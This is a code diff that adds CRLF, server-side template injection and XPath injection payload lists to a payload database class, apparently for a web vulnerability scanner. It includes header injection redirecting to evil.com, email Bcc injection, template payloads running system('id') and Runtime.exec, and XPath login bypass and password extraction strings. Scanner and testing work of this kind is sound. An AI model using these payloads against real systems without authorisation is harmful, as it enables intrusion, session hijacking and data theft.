@@ -172,6 +172,145 @@ class PayloadDB:
         '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe "XXE_TEST_STRING">]><test>&xxe;</test>',
     ]
 
+    # CRLF Injection Payloads (HTTP Response Splitting)
+    CRLF_PAYLOADS = [
+        # Basic CRLF with newlines
+        '%0d%0aSet-Cookie:crlf=injected',
+        '%0d%0aX-Injected-Header:crlf',
+        '%0ASet-Cookie:test=crlf',
+        '%0DSet-Cookie:test=crlf',
+
+        # URL encoded variants
+        '%0d%0a%0d%0a<html><body>CRLF</body></html>',
+        '%0aLocation:http://evil.com',
+        '%0d%0aLocation:%20http://evil.com',
+
+        # Double encoded
+        '%250d%250aSet-Cookie:crlf=injected',
+        '%250ASet-Cookie:test=crlf',
+
+        # Unicode encoded
+        '%u000d%u000aSet-Cookie:crlf=injected',
+
+        # Mixed encoding
+        '\\r\\nSet-Cookie:crlf=injected',
+        '\\nSet-Cookie:crlf=injected',
+
+        # Space variants (bypasses)
+        '%20%0d%0aSet-Cookie:crlf=injected',
+        '%00%0d%0aSet-Cookie:crlf=injected',
+
+        # HTTP Response Splitting (complete response)
+        '%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>CRLF</html>',
+
+        # Email injection (if in email context)
+        '%0aBcc:attacker@evil.com',
+        '%0d%0aCc:attacker@evil.com',
+
+        # Simple newline tests
+        '\\n',
+        '\\r',
+        '\\r\\n',
+        '%0a',
+        '%0d',
+        '%0d%0a',
+    ]
+
+    # SSTI (Server-Side Template Injection) Payloads
+    SSTI_PAYLOADS = [
+        # Detection payloads (math evaluation)
+        '{{7*7}}',              # Jinja2, Twig
+        '${7*7}',               # Velocity, FreeMarker, Spring
+        '<%= 7*7 %>',           # ERB (Ruby)
+        '#{7*7}',               # EL (Expression Language)
+        '{7*7}',                # Smarty (sometimes)
+        '[[7*7]]',              # Twig alternative
+        "{{7*'7'}}",            # Jinja2 string
+
+        # Jinja2 specific
+        '{{config}}',
+        '{{config.items()}}',
+        '{{self}}',
+        "{{''.__class__.__mro__[2].__subclasses__()}}",
+
+        # Twig specific
+        '{{_self}}',
+        '{{_self.env}}',
+        '{{dump(app)}}',
+        "{{['id']|filter('system')}}",
+
+        # FreeMarker specific
+        '${7*7}',
+
+        # Velocity specific
+        '#set($x=7*7)$x',
+
+        # Smarty specific
+        '{$smarty.version}',
+        '{if system("id")}{/if}',
+
+        # Pug (Jade)
+        '#{7*7}',
+        '= 7*7',
+
+        # ERB
+        '<%= 7*7 %>',
+
+        # Spring EL
+        '${T(java.lang.Runtime).getRuntime().exec("id")}',
+
+        # Safe detection (no RCE)
+        '{{7*7}}{{7*7}}',       # Double check
+        '${7+7}',               # Addition instead of multiplication
+        "{{\'test\'}}",         # Simple string
+    ]
+
+    # XPath Injection Payloads
+    XPATH_PAYLOADS = [
+        # Boolean-based XPath injection
+        "' or '1'='1",
+        "' or 1=1 or ''='",
+        "x' or 1=1 or 'x'='y",
+        '" or "1"="1',
+        '" or 1=1 or ""="',
+
+        # XPath authentication bypass
+        "admin' or '1'='1",
+        "' or '1'='1' --",
+        "' or '1'='1' /*",
+
+        # XPath syntax errors (detection)
+        "test'",
+        'test"',
+        "test']",
+        'test"]',
+
+        # XPath functions
+        "' and count(/*)=1 and '1'='1",
+        "' and string-length(name(/*[1]))>0 and '1'='1",
+
+        # XPath union (data extraction)
+        "' | //user/password | '",
+        "' | //user/* | '",
+        "' | //* | '",
+
+        # XPath substring (blind)
+        "' and substring(//user[1]/password,1,1)='a",
+        "test' and substring(name(/*[1]),1,1)='a' and 'a'='a",
+
+        # Comment-based
+        "']|[('')|*|@*|node()][('",
+
+        # Advanced
+        "'] | /* | a['",
+        "x'] | //user[@id=1] | a['a'='a",
+
+        # Error-based
+        "1/0",
+        "1 div 0",
+        "count('string')",
+    ]
+
     # Command injection payloads
     RCE_PAYLOADS = [
         '; id',
